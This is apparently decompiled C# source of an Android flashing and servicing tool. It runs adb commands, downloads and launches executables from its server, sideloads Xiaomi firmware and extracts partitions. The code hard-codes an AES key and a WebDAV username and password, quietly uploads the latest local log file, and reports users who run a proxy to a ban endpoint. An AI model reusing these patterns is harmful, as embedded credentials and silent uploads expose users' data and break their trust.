	private async Task _10f(object adbPath)
	{
		Msg("配置环境...");
		object obj = "C:\\TMFTool\\recadb";
		object obj2 = "C:\\TMFTool\\recadb\\recadb.zip";
		object adbPath2 = Path.Combine((string)obj, "adb.exe");
		Directory.CreateDirectory((string)obj);
		await _111(string.Concat(str2: "?encryptedRequest=" + await _21(), str0: (string)this.m_25, str1: "/TMFTool/recadb/recadb.zip"), obj2);
		try
		{
			ZipFile.ExtractToDirectory((string)obj2, (string)obj);
			fa();
			Msg("OK\n");
		}
		catch (Exception ex)
		{
			object obj3 = ex;
			Msg(((Exception)obj3).Message + "\n");
		}
		finally
		{
			File.Delete((string)obj2);
		}
		Msg("[读取]准备读取信息\n");
		object obj4 = new Dictionary<string, string>
		{
			{ "getdevice", "机型代号" },
			{ "getlanguage", "机型地区" },
			{ "getversion", "系统版本" },
			{ "getcodebase", "安卓版本" }
		};
		foreach (KeyValuePair<string, string> item in (Dictionary<string, string>)obj4)
		{
			object obj5 = await _112(adbPath2, item.Key);
			((TextBoxBase)this.m_c8).AppendText(item.Value + ": " + (string)obj5 + "\n");
		}
		((TextBoxBase)this.m_c8).ScrollToCaret();
		_113();
		_114(obj);
	}

	private async Task _110(object adbPath)
	{
		object obj = await _112(adbPath, "shell getprop ro.product.manufacturer");
		((TextBoxBase)this.m_c8).AppendText("制造商: " + (string)obj + "\n");
		object obj2 = await _112(adbPath, "shell getprop ro.product.model");
		((TextBoxBase)this.m_c8).AppendText("型号: " + (string)obj2 + "\n");
		object obj3 = await _112(adbPath, "shell getprop ro.product.name");
		((TextBoxBase)this.m_c8).AppendText("代号: " + (string)obj3 + "\n");
		object obj4 = (await _112(adbPath, "shell getprop ro.hardware; getprop ro.board.platform")).Split('\n');
		object obj5 = ((((Array)obj4).Length != 0) ? ((string)((object[])obj4)[0]).Trim() : "未知");
		object obj6 = ((((Array)obj4).Length > 1) ? ((string)((object[])obj4)[1]).Trim() : "未知");
		((TextBoxBase)this.m_c8).AppendText("芯片: " + (string)obj5 + "\n");
		((TextBoxBase)this.m_c8).AppendText("芯片平台: " + (string)obj6 + "\n");
		object obj7 = await _112(adbPath, "shell getprop ro.build.version.incremental");
		object obj8 = await _112(adbPath, "shell getprop ro.build.version.release");
		object obj9 = await _112(adbPath, "shell getprop ro.build.version.sdk");
		object obj10 = await _112(adbPath, "shell getprop ro.build.version.security_patch");
		((TextBoxBase)this.m_c8).AppendText("软件版本: " + (string)obj7 + "\n");
		((TextBoxBase)this.m_c8).ScrollToCaret();
		((TextBoxBase)this.m_c8).AppendText("安卓版本: " + (string)obj8 + "\n");
		((TextBoxBase)this.m_c8).ScrollToCaret();
		((TextBoxBase)this.m_c8).AppendText("API级别: " + (string)obj9 + "\n");
		((TextBoxBase)this.m_c8).ScrollToCaret();
		((TextBoxBase)this.m_c8).AppendText("安全补丁: " + (string)obj10 + "\n");
		((TextBoxBase)this.m_c8).ScrollToCaret();
		((Control)this.m_ee).Enabled = true;
		((Control)this.m_ef).Enabled = true;
		((Control)this.m_f3).Enabled = true;
		((Control)this.m_f4).Enabled = true;
		((Control)f1).Enabled = true;
		((Control)this.m_f2).Enabled = true;
	}

	private async Task _111(object url, object filePath, object onProgress = null)
	{
		object CS_0024_003C_003E8__locals3 = new _003C_003Ec__DisplayClass404_0();
		((_003C_003Ec__DisplayClass404_0)CS_0024_003C_003E8__locals3).onProgress = (Action<int>)onProgress;
		object obj = new WebClient();
		try
		{
			if (((_003C_003Ec__DisplayClass404_0)CS_0024_003C_003E8__locals3).onProgress != null)
			{
				((WebClient)obj).DownloadProgressChanged += (object s, DownloadProgressChangedEventArgs e) =>
				{
					((_003C_003Ec__DisplayClass404_0)CS_0024_003C_003E8__locals3).onProgress(e.ProgressPercentage);
				};
			}
			try
			{
				await ((WebClient)obj).DownloadFileTaskAsync(new Uri((string)url), (string)filePath);
			}
			catch (Exception ex)
			{
				MessageBox.Show("下载失败：" + ex.Message, "错误", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				EnableButtons();
			}
		}
		finally
		{
			((IDisposable)obj)?.Dispose();
		}
	}

	private async Task<string> _112(object adbPath, object arguments)
	{
		object CS_0024_003C_003E8__locals4 = new _003C_003Ec__DisplayClass405_0();
		((_003C_003Ec__DisplayClass405_0)CS_0024_003C_003E8__locals4).adbPath = (string)adbPath;
		((_003C_003Ec__DisplayClass405_0)CS_0024_003C_003E8__locals4).arguments = (string)arguments;
		return await Task.Run(() =>
		{
			try
			{
				ProcessStartInfo startInfo = new ProcessStartInfo
				{
					FileName = ((_003C_003Ec__DisplayClass405_0)CS_0024_003C_003E8__locals4).adbPath,
					Arguments = ((_003C_003Ec__DisplayClass405_0)CS_0024_003C_003E8__locals4).arguments,
					RedirectStandardOutput = true,
					UseShellExecute = false,
					CreateNoWindow = true
				};
				using Process process = Process.Start(startInfo);
				using StreamReader streamReader = process.StandardOutput;
				string text = streamReader.ReadToEnd();
				process.WaitForExit();
				return text.Trim();
			}
			catch (Exception ex)
			{
				return "命令执行失败: " + ex.Message;
			}
		});
	}

	private void _113()
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName("adb");
			Process[] array = processesByName;
			foreach (Process process in array)
			{
				process.Kill();
				process.WaitForExit();
			}
			((Control)this.m_ee).Enabled = true;
			((Control)this.m_ef).Enabled = true;
			((Control)this.m_f3).Enabled = true;
			((Control)this.m_f4).Enabled = true;
			((Control)f1).Enabled = true;
			((Control)this.m_f2).Enabled = true;
		}
		catch (Exception)
		{
			((Control)this.m_ee).Enabled = true;
			((Control)this.m_ef).Enabled = true;
			((Control)this.m_f3).Enabled = true;
			((Control)this.m_f4).Enabled = true;
			((Control)f1).Enabled = true;
			((Control)this.m_f2).Enabled = true;
		}
	}

	private void _114(object tempDir)
	{
		try
		{
			if (Directory.Exists((string)tempDir))
			{
				Directory.Delete((string)tempDir, recursive: true);
				((Control)this.m_ee).Enabled = true;
				((Control)this.m_ef).Enabled = true;
				((Control)this.m_f3).Enabled = true;
				((Control)this.m_f4).Enabled = true;
				((Control)f1).Enabled = true;
				((Control)this.m_f2).Enabled = true;
			}
		}
		catch (Exception)
		{
			((Control)this.m_ee).Enabled = true;
			((Control)this.m_ef).Enabled = true;
			((Control)this.m_f3).Enabled = true;
			((Control)this.m_f4).Enabled = true;
			((Control)f1).Enabled = true;
			((Control)this.m_f2).Enabled = true;
		}
	}

	private void _115(object sender, object e)
	{
		string value = ((Control)this.m_d8).Text.Trim();
		((UIComboBox)this.m_d8).Items.Clear();
		if (string.IsNullOrEmpty(value))
		{
			return;
		}
		foreach (ListViewItem item in ((ListView)this.m_d0).Items)
		{
			string text = item.SubItems[0].Text;
			if (text.IndexOf(value, StringComparison.OrdinalIgnoreCase) >= 0)
			{
				((UIComboBox)this.m_d8).Items.Add(text);
			}
		}
	}

	private void _116(object sender, EventArgs e)
	{
	}

	private void _117(object sender, object e)
	{
		if (((UIRadioButton)this.m_da).Checked)
		{
			this.m_58 = 4096uL;
			this.m_1f = "ufs";
			this.m_21 = (IntPtr)6;
			_20 = new string[7] { "gpt_main0.bin", "gpt_main1.bin", "gpt_main2.bin", "gpt_main3.bin", "gpt_main4.bin", "gpt_main5.bin", "gpt_main6.bin" };
		}
	}

	private void _118(object sender, object e)
	{
		if (((UIRadioButton)this.m_d9).Checked)
		{
			this.m_58 = 512uL;
			this.m_1f = "emmc";
			this.m_21 = (IntPtr)34;
			_20 = new string[1] { "gpt_main0.bin" };
		}
	}

	private void _119(object sender, object e)
	{
		((TextBoxBase)this.m_c8).Clear();
	}

	private async void _11a(object sender, object e)
	{
		((UIProcessBar)this.m_c1).Maximum = 100;
		object obj = "?encryptedRequest=" + await _21();
		((Control)this.m_db).Text = "下载中";
		((Control)this.m_db).Enabled = false;
		object requestUri = (string)this.m_25 + "/TMFTool/vivo.exe" + (string)obj;
		object fileName = Path.Combine(Path.GetTempPath(), "ViVo.exe");
		try
		{
			object obj2 = new HttpClient();
			try
			{
				((HttpClient)obj2).Timeout = TimeSpan.FromMinutes(30.0);
				object obj3 = await ((HttpClient)obj2).GetAsync((string)requestUri, HttpCompletionOption.ResponseHeadersRead);
				try
				{
					((HttpResponseMessage)obj3).EnsureSuccessStatusCode();
					long num = ((HttpResponseMessage)obj3).Content.Headers.ContentLength ?? (-1);
					object obj4 = await ((HttpResponseMessage)obj3).Content.ReadAsStreamAsync();
					try
					{
						object obj5 = new FileStream((string)fileName, FileMode.Create, FileAccess.Write, FileShare.None, 8192, useAsync: true);
						try
						{
							object obj6 = new byte[8192];
							long num2 = 0L;
							while (true)
							{
								nint num3 = await ((Stream)obj4).ReadAsync((byte[])obj6, 0, ((Array)obj6).Length);
								int num4 = (int)num3;
								IntPtr intPtr = num3;
								if (num4 <= 0)
								{
									break;
								}
								await ((Stream)obj5).WriteAsync((byte[])obj6, 0, (int)(nint)intPtr);
								num2 += (nint)intPtr;
								if (num > 0)
								{
									nint num5 = (int)(num2 * 100 / num);
									((UIProcessBar)this.m_c1).Value = (int)num5;
								}
								_ = (double)num2 / 1048576.0;
							}
						}
						finally
						{
							((IDisposable)obj5)?.Dispose();
						}
					}
					finally
					{
						((IDisposable)obj4)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)obj3)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)obj2)?.Dispose();
			}
			((Control)this.m_db).Text = "安装安卓驱动";
			((Control)this.m_db).Enabled = true;
			((TextBoxBase)this.m_c8).AppendText("驱动已就绪\n");
			((TextBoxBase)this.m_c8).SelectionStart = ((Control)this.m_c8).Text.Length;
			((TextBoxBase)this.m_c8).ScrollToCaret();
			Process.Start((string)fileName);
		}
		catch (Exception ex)
		{
			object obj7 = ex;
			((Control)this.m_db).Text = "安装安卓驱动";
			((Control)this.m_db).Enabled = true;
			((TextBoxBase)this.m_c8).AppendText("下载失败: " + ((Exception)obj7).Message + "\n");
			((TextBoxBase)this.m_c8).SelectionStart = ((Control)this.m_c8).Text.Length;
			((TextBoxBase)this.m_c8).ScrollToCaret();
		}
	}

	private void _11b(object sender, EventArgs e)
	{
	}

	private void _11c(object sender, object e)
	{
		string text = Path.Combine("C:\\TMFTool", "port_trace.txt");
		try
		{
			if (File.Exists(text))
			{
				File.Delete(text);
			}
		}
		catch (Exception)
		{
		}
	}

	private void _11d(object sender, object e)
	{
		_11f();
	}

	public static string Encrypt(string plainText, string key, string iv)
	{
		using Aes aes = Aes.Create();
		aes.Key = Encoding.UTF8.GetBytes(key);
		aes.IV = Encoding.UTF8.GetBytes(iv);
		ICryptoTransform transform = aes.CreateEncryptor(aes.Key, aes.IV);
		using MemoryStream memoryStream = new MemoryStream();
		using (CryptoStream stream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
		{
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.Write(plainText);
		}
		return Convert.ToBase64String(memoryStream.ToArray());
	}

	private async void _11f()
	{
		object defaultWebProxy = WebRequest.DefaultWebProxy;
		if (defaultWebProxy == null)
		{
			return;
		}
		object obj = new Uri("http://www.example.com");
		object proxy = ((IWebProxy)defaultWebProxy).GetProxy((Uri)obj);
		if (!((Uri)proxy != (Uri)obj))
		{
			return;
		}
		object filePath = _71();
		((System.Windows.Forms.Timer)this.m_a)?.Stop();
		await _74(filePath);
		object key = "tamimtamimtamiatamimtamiamtiamit";
		object iv = "tamimtamimtamtat";
		if (string.IsNullOrWhiteSpace((string)_24))
		{
			return;
		}
		object value = Encrypt((string)_24, (string)key, (string)iv);
		object obj2 = new HttpClient();
		try
		{
			object nameValueCollection = new Dictionary<string, string> { 
			{
				"username",
				(string)value
			} };
			object obj3 = JsonConvert.DeserializeObject<Dictionary<string, string>>(await (await ((HttpClient)obj2).PostAsync(content: (HttpContent)new FormUrlEncodedContent((IEnumerable<KeyValuePair<string, string>>)nameValueCollection), requestUri: (string)this.m_25 + "/api/V1/ban_api.php")).Content.ReadAsStringAsync());
			if (obj3 == null || ((Dictionary<string, string>)obj3)["status"] != "success")
			{
				return;
			}
			UIMessageBox.Show("检测到代理设置，电脑环境异常。程序将关闭。", "代理检测", (UIStyle)4, (UIMessageBoxButtons)0, false, true, 0);
			Application.Exit();
		}
		finally
		{
			((IDisposable)obj2)?.Dispose();
		}
	}

	private async void _120(object sender, object e)
	{
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		object obj = "?encryptedRequest=" + await _21();
		falseButtons();
		object url = (string)this.m_25 + "/TMFTool/rec.zip" + (string)obj;
		object obj2 = "C:\\TMFTool\\rec.zip";
		object obj3 = "C:\\TMFTool\\Rec";
		object adbPath = Path.Combine((string)obj3, "adb.exe");
		object miTokenPath = Path.Combine((string)obj3, "MI-TOKEN.exe");
		_ = string.Empty;
		((UIProcessBar)this.m_c1).Maximum = 100;
		try
		{
			_122();
			object obj4 = "C:\\TMFTool\\Rec\\MI-TOKEN.exe";
			if (!File.Exists((string)obj4) && !Directory.Exists((string)obj3))
			{
				Directory.CreateDirectory((string)obj3);
				Msg("配置环境...");
				await _121(url, obj2);
				fa();
				Msg("OK\n");
				ZipFile.ExtractToDirectory((string)obj2, (string)obj3);
				if (File.Exists((string)obj2))
				{
					File.Delete((string)obj2);
				}
			}
			Msg("连接小米助手...");
			if ((await _123(adbPath, "devices")).Contains("sideload"))
			{
				Msg("设备连接成功！\n");
				object obj5 = await _123(adbPath, "getdevice");
				object obj6 = await _123(adbPath, "getversion");
				if (string.IsNullOrEmpty((string)this.m_76))
				{
					this.m_76 = await _123(adbPath, "getcodebase");
				}
				object obj7 = await _123(adbPath, "getsn");
				if (!string.IsNullOrEmpty((string)obj5) && !string.IsNullOrEmpty((string)obj6) && !string.IsNullOrEmpty((string)this.m_76) && !string.IsNullOrEmpty((string)obj7))
				{
					((TextBoxBase)this.m_c8).AppendText("设备代号: " + (string)obj5 + "\n");
					((TextBoxBase)this.m_c8).AppendText("系统版本: " + (string)obj6 + "\n");
					((TextBoxBase)this.m_c8).AppendText("安卓版本: " + (string)this.m_76 + "\n");
					((TextBoxBase)this.m_c8).AppendText("NS: " + (string)obj7 + "\n");
					Msg("开始获取升级信息！\n");
					object obj8 = await _124(miTokenPath, obj5, obj6, this.m_76, obj7);
					if (((string)obj8).Contains("当前已是最新版本"))
					{
						Msg("当前系统已是最新无法升级更高！\n");
						EnableButtons();
					}
					else if (((string)obj8).Contains("未获取到相关ROM信息"))
					{
						if (string.IsNullOrEmpty((string)this.m_76))
						{
							this.m_76 = "";
							Msg("未获取到相关ROM信息\n");
							return;
						}
						if (((string)obj6).StartsWith("V14"))
						{
							this.m_76 = "13";
							Msg("未获取到相关ROM信息\n再次尝试获取！\n");
							_120(null, null);
							return;
						}
						Msg("未获取到相关ROM信息\n");
						EnableButtons();
					}
					else if (((string)obj8).Contains("向服务器发送请求时出错"))
					{
						this.m_76 = "";
						Msg("请关闭你的网络代理！\n");
						EnableButtons();
					}
					else if (((string)obj8).Contains("key=") && ((string)obj8).Contains("download="))
					{
						object key = _125(obj8, "key=");
						object obj9 = _125(obj8, "download=");
						this.m_76 = "";
						Msg("当前升级固件包: " + (string)obj9 + "\n");
						object obj10 = new OpenFileDialog
						{
							Title = "请选择升级固件包",
							Filter = "ZIP 文件 (*.zip)|*.zip"
						};
						if (((CommonDialog)obj10).ShowDialog() == DialogResult.OK)
						{
							object fileName = ((FileDialog)obj10).FileName;
							((Control)this.m_cd).Text = "";
							await _126(adbPath, fileName, key);
						}
						else
						{
							((TextBoxBase)this.m_c8).AppendText("未选择升级固件包！\n");
							EnableButtons();
						}
					}
				}
				else
				{
					((TextBoxBase)this.m_c8).AppendText("部分命令执行失败！\n");
					EnableButtons();
				}
			}
			else
			{
				((TextBoxBase)this.m_c8).AppendText("设备连接失败！\n");
				EnableButtons();
			}
		}
		catch (Exception ex)
		{
			object obj11 = ex;
			((TextBoxBase)this.m_c8).AppendText("操作失败: " + ((Exception)obj11).Message + "\n");
			EnableButtons();
		}
	}

	private async Task _121(object url, object destinationPath)
	{
		object obj = new WebClient();
		try
		{
			((WebClient)obj).DownloadProgressChanged += (object s, DownloadProgressChangedEventArgs e) =>
			{
				((UIProcessBar)this.m_c1).Value = ((ProgressChangedEventArgs)e).ProgressPercentage;
			};
			try
			{
				await ((WebClient)obj).DownloadFileTaskAsync(new Uri((string)url), (string)destinationPath);
			}
			catch (Exception)
			{
				msgred();
				Msg("Error\n");
			}
		}
		finally
		{
			((IDisposable)obj)?.Dispose();
		}
	}

	private void _122()
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName("adb");
			Process[] array = processesByName;
			foreach (Process process in array)
			{
				process.Kill();
				process.WaitForExit();
			}
		}
		catch (Exception ex)
		{
			((TextBoxBase)this.m_c8).AppendText("结束 adb 进程失败: " + ex.Message + "\n");
		}
	}

	private async Task<string> _123(object adbPath, object arguments)
	{
		try
		{
			object startInfo = new ProcessStartInfo
			{
				FileName = (string)adbPath,
				Arguments = (string)arguments,
				RedirectStandardOutput = true,
				UseShellExecute = false,
				CreateNoWindow = true
			};
			object obj = new Process();
			try
			{
				((Process)obj).StartInfo = (ProcessStartInfo)startInfo;
				((Process)obj).Start();
				object standardOutput = ((Process)obj).StandardOutput;
				try
				{
					object obj2 = await ((TextReader)standardOutput).ReadToEndAsync();
					await ((Process)obj).WaitForExitAsync();
					return ((string)obj2).Trim();
				}
				finally
				{
					((IDisposable)standardOutput)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)obj)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			object obj3 = ex;
			((TextBoxBase)this.m_c8).AppendText("执行 " + (string)arguments + " 命令失败: " + ((Exception)obj3).Message + "\n");
			return string.Empty;
		}
	}

	private async Task<string> _124(object miTokenPath, object deviceResult, object versionResult, object codebaseResult, object snResult)
	{
		try
		{
			object startInfo = new ProcessStartInfo
			{
				FileName = (string)miTokenPath,
				Arguments = (string)deviceResult + " " + (string)versionResult + " " + (string)codebaseResult + " " + (string)snResult,
				RedirectStandardOutput = true,
				UseShellExecute = false,
				CreateNoWindow = true
			};
			object obj = new Process();
			try
			{
				((Process)obj).StartInfo = (ProcessStartInfo)startInfo;
				((Process)obj).Start();
				object standardOutput = ((Process)obj).StandardOutput;
				try
				{
					object obj2 = await ((TextReader)standardOutput).ReadToEndAsync();
					await ((Process)obj).WaitForExitAsync();
					return ((string)obj2).Trim();
				}
				finally
				{
					((IDisposable)standardOutput)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)obj)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			object obj3 = ex;
			((TextBoxBase)this.m_c8).AppendText("执行 MI-TOKEN.exe 失败: " + ((Exception)obj3).Message + "\n");
			return string.Empty;
		}
	}

	private object _125(object input, object key)
	{
		int num = ((string)input).IndexOf((string)key) + ((string)key).Length;
		int num2 = ((string)input).IndexOf('\n', num);
		if (num2 == -1)
		{
			num2 = ((string)input).Length;
		}
		return ((string)input).Substring(num, num2 - num).Trim();
	}

	private async Task _126(object adbPath, object zipFilePath, object key)
	{
		Msg("开始升级...");
		try
		{
			object startInfo = new ProcessStartInfo
			{
				FileName = (string)adbPath,
				Arguments = "sideload \"" + (string)zipFilePath + "\" " + (string)key,
				RedirectStandardOutput = true,
				UseShellExecute = false,
				CreateNoWindow = true
			};
			object obj = new Process();
			try
			{
				((Process)obj).StartInfo = (ProcessStartInfo)startInfo;
				((Process)obj).Start();
				object standardOutput = ((Process)obj).StandardOutput;
				try
				{
					while (!((StreamReader)standardOutput).EndOfStream)
					{
						object obj2 = await ((TextReader)standardOutput).ReadLineAsync();
						object obj3 = Regex.Match((string)obj2, "\\(~(\\d+)%\\)");
						if (((Group)obj3).Success)
						{
							object value = ((Match)obj3).Groups[1].Value;
							IntPtr result;
							if (NativeValues.TryParseInt32((string)value, out result))
							{
								_94($"升级进度... {(int)(nint)result}%");
								((UIProcessBar)this.m_c1).Value = (int)(nint)result;
								((Control)this.m_cf).Text = $"UPdata System: {(int)(nint)result}%";
							}
						}
						else if (((string)obj2).Contains("2.00x"))
						{
							((TextBoxBase)this.m_c8).AppendText("\n升级成功！\n");
						}
						else if (((string)obj2).Contains("0.00x"))
						{
							((TextBoxBase)this.m_c8).AppendText("\n升级失败！\n");
						}
						else if (((string)obj2).Contains("error"))
						{
							((TextBoxBase)this.m_c8).AppendText("\n连接断开！\n");
						}
					}
					EnableButtons();
					((UIProcessBar)this.m_c1).Value = 100;
					nint num = 1;
					((Control)this.m_cf).Text = "升级结束";
					await ((Process)obj).WaitForExitAsync();
					((Control)this.m_fa).Enabled = true;
					if ((int)num != 0)
					{
						DialogResult dialogResult = MessageBox.Show("升级操作似乎完成，是否现在重启设备？", "重启设备", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
						if (dialogResult == DialogResult.Yes)
						{
							await _127(adbPath, "reboot");
						}
					}
				}
				finally
				{
					((IDisposable)standardOutput)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)obj)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			object obj4 = ex;
			((TextBoxBase)this.m_c8).AppendText("执行 adb sideload 命令失败: " + ((Exception)obj4).Message + "\n");
		}
	}

	private async Task _127(object adbPath, object arguments)
	{
		try
		{
			object startInfo = new ProcessStartInfo
			{
				FileName = (string)adbPath,
				Arguments = (string)arguments,
				RedirectStandardOutput = true,
				UseShellExecute = false,
				CreateNoWindow = true
			};
			object obj = new Process();
			try
			{
				((Process)obj).StartInfo = (ProcessStartInfo)startInfo;
				((Process)obj).Start();
				object standardOutput = ((Process)obj).StandardOutput;
				try
				{
					object obj2 = await ((TextReader)standardOutput).ReadToEndAsync();
					await ((Process)obj).WaitForExitAsync();
					((TextBoxBase)this.m_c8).AppendText((string)obj2 + "\n");
				}
				finally
				{
					((IDisposable)standardOutput)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)obj)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			object obj3 = ex;
			((TextBoxBase)this.m_c8).AppendText("执行 " + (string)arguments + " 命令失败: " + ((Exception)obj3).Message + "\n");
		}
	}

	private void _128(object sender, ToolStripItemClickedEventArgs e)
	{
	}

	private async void _129(object sender, object e)
	{
		((UIProcessBar)this.m_c1).Maximum = 100;
		object requestUri = string.Concat(str2: "?encryptedRequest=" + await _21(), str0: (string)this.m_25, str1: "/TMFTool/payload_dumper.exe");
		try
		{
			if (!File.Exists((string)this.m_77))
			{
				((Control)this.m_e2).Enabled = false;
				object obj = new HttpClient();
				try
				{
					object obj2 = await ((HttpClient)obj).GetAsync((string)requestUri, HttpCompletionOption.ResponseHeadersRead);
					((HttpResponseMessage)obj2).EnsureSuccessStatusCode();
					long num = ((HttpResponseMessage)obj2).Content.Headers.ContentLength ?? (-1);
					if (num > 0)
					{
						((TextBoxBase)this.m_c8).AppendText("开始配置环境...");
						((UIProcessBar)this.m_c1).Maximum = (int)num;
						((UIProcessBar)this.m_c1).Value = 0;
					}
					object obj3 = await ((HttpResponseMessage)obj2).Content.ReadAsStreamAsync();
					try
					{
						object obj4 = new FileStream((string)this.m_77, FileMode.Create, FileAccess.Write, FileShare.None, 8192, useAsync: true);
						try
						{
							object obj5 = new byte[8192];
							long num2 = 0L;
							while (true)
							{
								nint num3 = await ((Stream)obj3).ReadAsync((byte[])obj5, 0, ((Array)obj5).Length);
								int num4 = (int)num3;
								IntPtr intPtr = num3;
								if (num4 <= 0)
								{
									break;
								}
								await ((Stream)obj4).WriteAsync((byte[])obj5, 0, (int)(nint)intPtr);
								num2 += (nint)intPtr;
								if (num > 0)
								{
									((UIProcessBar)this.m_c1).Value = (int)num2;
								}
							}
						}
						finally
						{
							((IDisposable)obj4)?.Dispose();
						}
					}
					finally
					{
						((IDisposable)obj3)?.Dispose();
					}
					((RichTextBox)this.m_c8).SelectionColor = Color.DodgerBlue;
					((TextBoxBase)this.m_c8).AppendText("OK\n");
				}
				finally
				{
					((IDisposable)obj)?.Dispose();
				}
			}
			object obj6 = (object)new VistaFolderBrowserDialog();
			try
			{
				((VistaFolderBrowserDialog)obj6).Description = "请选择文件夹";
				((VistaFolderBrowserDialog)obj6).UseDescriptionForTitle = true;
				((VistaFolderBrowserDialog)obj6).ShowNewFolderButton = true;
				if (((CommonDialog)obj6).ShowDialog((IWin32Window)this) == DialogResult.OK)
				{
					object selectedPath = ((VistaFolderBrowserDialog)obj6).SelectedPath;
					object text = ((Control)this.m_e0).Text;
					object text2 = ((Control)this.m_e1).Text;
					((TextBoxBase)this.m_c8).AppendText("输入的URL: " + (string)text2 + "\n");
					((TextBoxBase)this.m_c8).AppendText("输入的分区: " + (string)text + "\n");
					((TextBoxBase)this.m_c8).AppendText("保存文件位置: " + (string)selectedPath + "\n");
					Msg("开始提取分区....");
					await (Task<bool>)_12a(text, text2, selectedPath);
				}
				else
				{
					((RichTextBox)this.m_c8).SelectionColor = Color.Red;
					((TextBoxBase)this.m_c8).AppendText("用户取消选择文件夹。\n");
					((RichTextBox)this.m_c8).SelectionColor = Color.Black;
				}
			}
			finally
			{
				((IDisposable)obj6)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			object obj7 = ex;
			((RichTextBox)this.m_c8).SelectionColor = Color.Red;
			((TextBoxBase)this.m_c8).AppendText("操作失败: " + ((Exception)obj7).Message + "\n");
			((RichTextBox)this.m_c8).SelectionColor = Color.Black;
		}
		finally
		{
			((Control)this.m_e2).Enabled = true;
		}
	}

	private object _12a(object partitionName, object Link, object patch)
	{
		string partitionName2 = (string)partitionName;
		string Link2 = (string)Link;
		string patch2 = (string)patch;
		((UIProcessBar)this.m_c1).Value = 0;
		return Task.Run(() =>
		{
			try
			{
				string arguments = "--partitions " + partitionName2 + " \"" + Link2 + "\" --out \"" + patch2 + "\"";
				ProcessStartInfo startInfo = new ProcessStartInfo
				{
					FileName = (string)this.m_77,
					Arguments = arguments,
					UseShellExecute = false,
					CreateNoWindow = true,
					RedirectStandardOutput = true,
					RedirectStandardError = true,
					StandardOutputEncoding = Encoding.GetEncoding("GB2312")
				};
				bool extractSuccess = false;
				int lastProgress = 0;
				using Process process = new Process
				{
					StartInfo = startInfo
				};
				process.OutputDataReceived += (object s, DataReceivedEventArgs e) =>
				{
					if (!string.IsNullOrEmpty(e.Data))
					{
						if (e.Data.Contains(partitionName2 + " [") && e.Data.Contains("%]"))
						{
							int num = e.Data.IndexOf('[');
							int num2 = e.Data.IndexOf('%');
							if (num > 0 && num2 > num)
							{
								string s2 = e.Data.Substring(num + 1, num2 - num - 1);
								if (double.TryParse(s2, out var result))
								{
									int value = (int)Math.Round(result);
									if (value > lastProgress)
									{
										lastProgress = value;
										((Control)this.m_c1).Invoke((Delegate)(Action)(() =>
										{
											((UIProcessBar)this.m_c1).Value = Math.Min(value, 100);
										}));
									}
								}
							}
						}
						if (e.Data.Contains("提取完成"))
						{
							extractSuccess = true;
						}
					}
				};
				process.Start();
				process.BeginOutputReadLine();
				string text = process.StandardError.ReadToEnd();
				process.WaitForExit();
				if (extractSuccess)
				{
					fa();
					Msg("OK\n");
					((Control)this).Invoke((Delegate)(Action)(() =>
					{
						((Form)this).DialogResult = AntdUI.Modal.open((Form)(object)this, "分区提取完成 \n是否打开文件夹？", "提示", (TType)1);
					}));
					if (((Form)this).DialogResult == DialogResult.OK)
					{
						Process.Start("explorer.exe", patch2);
					}
					return true;
				}
				Msg("提取失败-请检查URl或分区名是否正确-或请关闭代理服务器\n");
				return false;
			}
			catch (Exception ex)
			{
				Msg("运行出错: " + ex.Message + "\n");
				return false;
			}
		});
	}

	private void _12b(object sender, object e)
	{
		((Control)this.m_e1).Text = Clipboard.GetText();
	}

	private async void _12c(object sender, object e)
	{
		object obj = "C:\\TMFTool_Log";
		object obj2 = (string)this.m_78 + "/dav/日志/" + ((Control)this.m_92).Text + "/日志/";
		object obj3 = "sb";
		object obj4 = "llxll1008";
		try
		{
			object obj5 = new DirectoryInfo((string)obj);
			object obj6 = (from f in ((DirectoryInfo)obj5).GetFiles()
				orderby f.LastWriteTime descending
				select f).FirstOrDefault();
			if (obj6 != null)
			{
				object fullName = ((FileSystemInfo)obj6).FullName;
				object name = ((FileSystemInfo)obj6).Name;
				if (!((string)obj2).EndsWith("/"))
				{
					obj2 = (string)obj2 + "/";
				}
				object requestUri = (string)obj2 + (string)name;
				object obj7 = new ByteArrayContent(File.ReadAllBytes((string)fullName));
				((HttpContent)obj7).Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
				object request = new HttpRequestMessage(HttpMethod.Put, (string)requestUri)
				{
					Content = (HttpContent)obj7
				};
				object parameter = Convert.ToBase64String(Encoding.ASCII.GetBytes((string)obj3 + ":" + (string)obj4));
				((HttpClient)_52).DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Basic", (string)parameter);
				object obj8 = await ((HttpClient)_52).SendAsync((HttpRequestMessage)request);
				if (!((HttpResponseMessage)obj8).IsSuccessStatusCode)
				{
					await ((HttpResponseMessage)obj8).Content.ReadAsStringAsync();
				}
			}
		}
		catch (Exception)
		{
		}
	}

	private void _12d(object sender, EventArgs e)
	{
	}

	private async void _12e(object sender, object e)
	{
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		object obj = new OpenFileDialog
		{
			Filter = "IMG Files (*.img)|*.img|All Files (*.*)|*.*"
		};
		if (((CommonDialog)obj).ShowDialog() != DialogResult.OK)
		{
			return;
		}
		object obj2 = "?encryptedRequest=" + await _21();
		object fileName = ((FileDialog)obj).FileName;
		object obj3 = "C:\\TMFTool";
		object obj4 = Path.Combine((string)obj3, "acc.zip");
		object fileName2 = Path.Combine((string)obj3, "magiskboot.exe");
